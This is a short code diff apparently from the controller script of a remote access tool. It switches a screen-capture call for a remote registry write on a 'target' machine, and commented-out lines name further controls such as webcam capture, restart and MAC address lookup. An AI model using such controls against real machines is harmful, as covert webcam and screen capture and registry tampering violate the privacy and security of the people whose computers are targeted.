@@ -90,4 +90,6 @@ t.start()
 # handler.restart(target[1])
 # handler.mac_address(target[1])
 # handler.capture_webcam(target[1], 3) # second
-handler.capture_screen(target[1])
+# handler.capture_screen(target[1])
+# handler.registry_list(target[1], "HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\2fcf99be")
+handler.registry_update(target[1], "HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\2fcf99be\\Hello", 'Hellooooooo Worldddddd', 'REG_SZ')
